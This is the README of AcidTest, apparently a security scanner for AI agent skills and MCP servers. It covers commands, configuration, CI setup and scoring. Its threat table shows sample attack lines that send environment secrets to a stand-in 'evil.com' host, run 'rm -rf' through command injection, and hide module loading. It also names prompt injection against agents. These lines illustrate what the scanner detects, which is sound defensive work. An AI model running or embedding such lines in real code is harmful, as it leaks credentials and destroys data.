# AcidTest

<p align="center">
  <strong>Security scanner for AI agent skills and MCP servers. Scan before you install.</strong>
</p>

<p align="center">
  <a href="https://www.npmjs.com/package/acidtest">
    <img src="https://img.shields.io/npm/v/acidtest" alt="npm version">
  </a>
  <a href="https://github.com/currentlycurrently/acidtest/actions">
    <img src="https://img.shields.io/github/actions/workflow/status/currentlycurrently/acidtest/test.yml?branch=main" alt="build status">
  </a>
  <a href="https://github.com/currentlycurrently/acidtest">
    <img src="https://img.shields.io/github/stars/currentlycurrently/acidtest?style=social" alt="GitHub stars">
  </a>
  <a href="https://www.npmjs.com/package/acidtest">
    <img src="https://img.shields.io/npm/dm/acidtest" alt="npm downloads">
  </a>
  <a href="./LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="license">
  </a>
</p>

---

## The Problem

**February 2026: The AI agent security crisis went mainstream.**

Researchers discovered **341 malicious skills on ClawHub** (12% of all published skills):
- **ClawHavoc campaign:** 335 infostealer packages deploying Atomic macOS Stealer
- **283 skills leaking credentials** (7.1% of ecosystem)
- **1,467 security flaws** found by Snyk across 3,984 scanned skills (36.82%)
- **30,000+ exposed OpenClaw instances** on the public internet

The ecosystem is growing faster than security can keep up:
- **No centralized vetting**: Unlike mobile app stores, there's no security review before skills are published
- **Broad permissions**: Skills can request file system access, environment variables, and network calls
- **Supply chain risks**: Dependencies and third-party code run with full skill permissions
- **Prompt injection**: Malicious skills can manipulate AI behavior through carefully crafted prompts

**AcidTest provides security scanning before installation**, helping you identify risks before they reach your system.

Industry response:
- OpenClaw integrated VirusTotal scanning (February 7, 2026)
- Cisco released an LLM-based Skill Scanner
- Snyk published ToxicSkills research

**AcidTest's differentiator:** Dataflow analysis. We track data flow from sources to sinks, catching multi-step attacks that pattern matching alone misses.

## Quick Start
```bash
# See AcidTest in action
npx acidtest demo

# Scan ANY AI agent code (works on any Python/TypeScript project)
npx acidtest scan ./my-skill
npx acidtest scan ./my-mcp-server
npx acidtest scan ./downloaded-from-clawhub

# No manifest required - we scan the code anyway
npx acidtest scan ./suspicious-python-script
```

**No manifest required. No API keys. No configuration.** Works with AgentSkills, MCP servers, or any Python/TypeScript code.

**What makes us different:**
- ✅ Scans code even without SKILL.md or mcp.json
- ✅ Dataflow analysis tracks multi-step attacks
- ✅ 104 patterns across 14 threat categories
- ✅ Runs completely offline (no cloud uploads)

## Example Output
```
AcidTest v1.0.1

Scanning: proactive-agent
Source:   test-skills/proactive-agent-1-2-4-1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TRUST SCORE: 72/100 ███████░░░ WARN

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FINDINGS

  ✖ CRITICAL instruction-override
    SKILL.md:170
    Attempts to override agent instructions
    3 matches found

  ○ LOW      No declared permissions
    SKILL.md
    Skill declares no permissions (bins, env, or allowed-tools)
    Legitimate skills typically declare at least one permission

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RECOMMENDATION: Do not install. Prompt injection attempt detected.
```

## What AcidTest Catches

| Threat | TypeScript Example | Python Example | Detection Method |
|--------|-------------------|----------------|------------------|
| **Arbitrary Code Execution** | `eval(userInput)`, `new Function()` | `eval(user_input)`, `exec(code)` | AST analysis + pattern matching |
| **Command Injection** | `exec('rm -rf ' + dir)` | `subprocess.run(cmd, shell=True)` | AST analysis + pattern matching |
| **Unsafe Deserialization** | N/A | `pickle.loads(data)` | AST analysis + pattern matching |
| **Data Exfiltration** | `const k = process.env.KEY; fetch('evil.com', {body: k})` | `key = os.environ['KEY']; requests.post('evil.com', data=key)` | Dataflow analysis |
| **Hardcoded Credentials** | `apiKey = "sk_live_..."` | `API_KEY = "sk_live_..."` | Pattern matching + entropy |
| **Prompt Injection** | Markdown instruction override | Markdown instruction override | Injection detection layer |
| **Obfuscation** | Base64/hex encoded payloads | Base64/hex encoded payloads | Shannon entropy analysis |
| **Supply Chain Attacks** | `require('child_' + 'process')` | `__import__(module_name)` | AST bypass detection |
| **Permission Escalation** | Undeclared network/filesystem access | Undeclared network/filesystem access | Permission audit + crossref |

**What AcidTest Doesn't Catch:**
- Zero-day exploits in Node.js itself
- Vulnerabilities in npm dependencies (use `npm audit` for this)
- Runtime behavior outside static analysis scope
- Sophisticated polymorphic code or advanced VM-level evasion

See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency on capabilities and limitations (90-95% detection rate with dataflow).

## How It Works

AcidTest runs five analysis layers:
1. **Permission Audit**: Analyzes declared permissions (bins, env, tools)
2. **Prompt Injection Scan**: Detects instruction override attempts (AgentSkills)
3. **Code Analysis**: Multi-language AST analysis + Shannon entropy detection for obfuscation
4. **Cross-Reference**: Catches code behavior not matching declared permissions
5. **Dataflow Analysis** ✨ NEW: Tracks taint flow from sources (env vars, user input) to dangerous sinks (exec, fetch)

**Language Support:**
- **TypeScript/JavaScript**: Full AST analysis with 59 security patterns
- **Python**: Full AST analysis with 45 Python-specific patterns (tree-sitter based)
- Detects eval/exec, subprocess injection, unsafe deserialization, SQL injection, XSS, and more

**Advanced Features:**
- **104 security patterns** across 14 categories (SQL injection, XSS, insecure crypto, prototype pollution, etc.)
- **Multi-step attack detection**: Tracks data flow through assignments, properties, and function calls
- **Entropy analysis**: Detects base64/hex encoding and obfuscated strings
- **Context-aware detection**: shell=True, SafeLoader, dangerouslySetInnerHTML, etc.
- **CI/CD integration**: GitHub Actions and pre-commit hooks

Works with both SKILL.md (AgentSkills) and MCP manifests (mcp.json, server.json, package.json).

## Why AcidTest?

| Feature | AcidTest | npm audit | Manual Review | Sandboxing |
|---------|----------|-----------|---------------|------------|
| **Speed** | ⚡ <2 seconds | ⚡ <1 second | 🐌 Hours | ⚡ Seconds |
| **Agent-Specific Threats** | ✅ Yes | ❌ No | ✅ Yes | ⚠️ Partial |
| **Code Analysis** | ✅ AST + Regex | ❌ Manifest only | ✅ Full | ❌ Runtime only |
| **Prompt Injection** | ✅ Detects | ❌ N/A | ✅ Detects | ❌ N/A |
| **Dependency Vulns** | ❌ No | ✅ Yes | ⚠️ Partial | ❌ No |
| **Setup Required** | 🟢 Zero config | 🟢 Built-in | 🔴 Expert knowledge | 🟡 Complex |
| **Cost** | 🟢 Free | 🟢 Free | 🔴 Expensive | 🟡 Infrastructure |
| **Pre-Installation** | ✅ Yes | ✅ Yes | ✅ Yes | ❌ Post-install |

**Defense-in-depth approach:** Use AcidTest **with** `npm audit` and sandboxing for comprehensive security.

## What Makes Us Different

The ClawHub crisis triggered a wave of security tools. Here's how we compare:

**vs. Cisco Skill Scanner:** They use LLM-as-judge (semantic inspection). We use dataflow analysis (deterministic, free, explainable).

**vs. VirusTotal:** They use malware signatures (hash-based). We use static analysis (behavior-based). Use both: VirusTotal for known threats, AcidTest for novel attacks.

**vs. Snyk:** They did excellent research (ToxicSkills report). We built a tool you can run locally today.

**vs. Clawhatch:** They have 128 regex checks. We have 104 AST patterns + dataflow/taint propagation.

**Our unique value:** Layer 5 Dataflow Analysis tracks data from sources (env vars, user input) through assignments and function calls to dangerous sinks (exec, eval, fetch).

Example of what dataflow catches that pattern matching misses:
```python
# Pattern matching: "subprocess imported" → MEDIUM
# Dataflow: "user input → subprocess shell=True" → CRITICAL

cmd = sys.argv[1]                           # SOURCE
subprocess.call(f"echo {cmd}", shell=True)  # SINK
# AcidTest detects the 2-step command injection path
```

See [METHODOLOGY.md](./METHODOLOGY.md) for technical details.

## Install
```bash
npm install -g acidtest
```

Or use without installing:
```bash
npx acidtest scan ./path-to-skill
```

## Usage

### CLI Commands
```bash
# See AcidTest in action with demo fixtures
acidtest demo

# Scan an AgentSkills skill
acidtest scan ./my-skill
acidtest scan ./my-skill/SKILL.md

# Scan an MCP server
acidtest scan ./my-mcp-server          # Auto-detects mcp.json, server.json, etc.
acidtest scan ./server/mcp.json        # Direct manifest path

# Scan all skills/servers in a directory
acidtest scan-all ./directory

# Watch mode - re-scan on file changes
acidtest scan ./my-skill --watch
acidtest scan ./my-skill -w            # Short form

# Show remediation suggestions
acidtest scan ./my-skill --fix

# Combine flags
acidtest scan ./my-skill --watch --fix

# JSON output for programmatic use
acidtest scan ./my-skill --json

# Start as MCP server (for AI agents)
acidtest serve
```

### CLI Options

- `--watch`, `-w` - Watch for file changes and automatically re-scan
  - Keyboard controls: `q` to quit, `r` to force re-scan, `c` to clear terminal
  - Use `--no-clear` to preserve terminal history between scans
- `--fix` - Show actionable remediation suggestions for each finding
- `--json` - Output results as JSON for programmatic use
- `--no-clear` - Don't clear terminal between scans (watch mode only)

### Configuration File

Create a `.acidtest.json` file in your skill directory to customize scanning behavior:

```json
{
  "ignore": {
    "patterns": ["di-008"],
    "categories": ["obfuscation"],
    "files": ["vendor/**", "*.min.js"]
  },
  "thresholds": {
    "minScore": 80,
    "failOn": ["CRITICAL", "HIGH"]
  },
  "output": {
    "format": "detailed",
    "showRemediation": true,
    "colors": true
  }
}
```

**Configuration Options:**

- `ignore.patterns` - Array of pattern IDs to suppress (e.g., `["di-001", "cp-006"]`)
- `ignore.categories` - Array of categories to suppress (e.g., `["obfuscation"]`)
- `ignore.files` - Array of glob patterns for files to skip scanning
- `thresholds.minScore` - Minimum passing score (0-100). Exit with error if score is below this
- `thresholds.failOn` - Array of severities that cause scan to fail (e.g., `["CRITICAL", "HIGH"]`)
- `output.format` - Output format: `"detailed"`, `"compact"`, or `"json"`
- `output.showRemediation` - Show remediation suggestions (boolean)
- `output.colors` - Enable/disable colored output (boolean)

CLI flags override config file settings.

### Use as MCP Server

AcidTest can run as an MCP (Model Context Protocol) server, allowing AI agents like Claude to scan skills and MCP servers before installation.

#### Claude Desktop Configuration

Add to your `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "acidtest": {
      "command": "npx",
      "args": ["-y", "acidtest", "serve"]
    }
  }
}
```

Or if installed globally:

```json
{
  "mcpServers": {
    "acidtest": {
      "command": "acidtest",
      "args": ["serve"]
    }
  }
}
```

#### Available MCP Tools

- **`scan_skill`**: Scan a single skill or MCP server
  - Input: `{ "path": "/path/to/skill" }`
  - Returns: Full scan result with trust score and findings

- **`scan_all`**: Scan all skills/servers in a directory
  - Input: `{ "directory": "/path/to/directory" }`
  - Returns: Array of scan results

Once configured, Claude can scan skills before installation:
```
User: "Can you scan this MCP server before I install it?"
Claude: [Uses acidtest scan_skill tool to analyze the server]
```

### Quick Start with Template

The fastest way to start building secure AI agent skills:

```bash
# Use the template repository
# Visit: https://github.com/currentlycurrently/acidtest/tree/main/template-repo

# Or manually create a new skill
mkdir my-skill && cd my-skill
npm init -y
echo '---\nname: my-skill\n---\n# My Skill' > SKILL.md

# Add AcidTest to CI/CD
mkdir -p .github/workflows
curl -o .github/workflows/acidtest.yml https://raw.githubusercontent.com/currentlycurrently/acidtest/main/template-repo/.github/workflows/acidtest.yml
```

The [template repository](./template-repo/) includes:
- ✅ AcidTest pre-configured
- ✅ GitHub Actions workflow with PR comments
- ✅ TypeScript setup
- ✅ Best practices guide
- ✅ Example handler

### Use in CI/CD

Automate security scanning in your GitHub Actions workflows.

#### Quick Setup

Copy this workflow to `.github/workflows/acidtest.yml`:

```yaml
name: Security Scan

on: [pull_request, push]

jobs:
  acidtest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npx acidtest@latest scan . --json > results.json
      - run: |
          STATUS=$(jq -r '.status' results.json)
          if [ "$STATUS" = "FAIL" ] || [ "$STATUS" = "DANGER" ]; then
            echo "❌ Security scan failed"
            exit 1
          fi
```

#### PR Comments (Recommended)

Automatically comment on pull requests with detailed scan results:

```yaml
name: AcidTest Security Scan

on:
  pull_request:
    paths: ['**.ts', '**.js', 'SKILL.md', 'mcp.json']

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Run AcidTest
        run: npx acidtest@latest scan . --json > results.json || true

      # ... (PR comment script)
```

See [`.github/workflows/acidtest-pr-comment.yml`](.github/workflows/acidtest-pr-comment.yml) for the complete PR comment workflow.

#### Security Badge

Show that your skill is security-scanned:

```markdown
[![Security: AcidTest](https://img.shields.io/badge/security-AcidTest-brightgreen)](https://github.com/currentlycurrently/acidtest)
```

Displays: [![Security: AcidTest](https://img.shields.io/badge/security-AcidTest-brightgreen)](https://github.com/currentlycurrently/acidtest)

#### Pre-Commit Hook

Catch issues before committing:

```bash
# Install pre-commit hook
curl -o .git/hooks/pre-commit https://raw.githubusercontent.com/currentlycurrently/acidtest/main/hooks/pre-commit
chmod +x .git/hooks/pre-commit

# Now every commit runs AcidTest automatically
git commit -m "Add new feature"  # Scans before committing
```

See [`hooks/README.md`](hooks/README.md) for installation options and configuration.

## Scoring

Starts at 100, deducts by severity (CRITICAL: -25, HIGH: -15, MEDIUM: -8, LOW: -3). Score 80+ is PASS, 50-79 is WARN, 20-49 is FAIL, below 20 is DANGER.

<!--
## Testimonials

TODO: Add testimonials from dogfooding campaign (Task 1 - Phase 2)

> "AcidTest found 3 CRITICAL vulnerabilities in my skill that I completely missed. Required tool for any AI developer."
> — [Developer Name], Maintainer of [Skill Name]

> "We integrated AcidTest into our CI/CD pipeline. Caught a backdoor in a community contribution before it hit production."
> — [Company Name]
-->

## Our Take on the Crisis

The ClawHub security findings (341 malicious skills, 12%) are a wake-up call, but not a death sentence.

**What we believe:**

**1. The crisis is real, but concentrated**
- 90% of skills are secure (our validation: 145/161 PASS)
- ClawHavoc campaign = 335 of 341 malicious skills
- Ecosystem can recover with better tooling

**2. No single tool is the answer**
Defense-in-depth means using multiple layers:
- AcidTest (pre-install static analysis)
- npm audit (dependency vulnerabilities)
- VirusTotal (known malware)
- Sandboxing (runtime isolation)

**3. Transparency builds trust**
We're honest about our ~90-95% detection rate. We document what we can't catch. We show our work in [METHODOLOGY.md](./METHODOLOGY.md).

**4. Open source is the path forward**
Proprietary scanners create vendor lock-in. Our 104 patterns are JSON files you can review, improve, and contribute to.

**Scan before you install. Make it a habit.**

## Contributing

Detection patterns are JSON files in `src/patterns/`. Add new patterns and submit a PR.

## License

MIT

## Documentation

- [Methodology](./METHODOLOGY.md) - Security approach and limitations (90-95% detection rate)
- [Changelog](./CHANGELOG.md) - Version history
- [Contributing](./CONTRIBUTING.md) - How to add detection patterns
- [Security Policy](./SECURITY.md) - Responsible disclosure
- [Template Repository](./template-repo/) - Starter kit with AcidTest pre-configured

## Links

- Issues: https://github.com/currentlycurrently/acidtest/issues
- Website: https://acidtest.dev
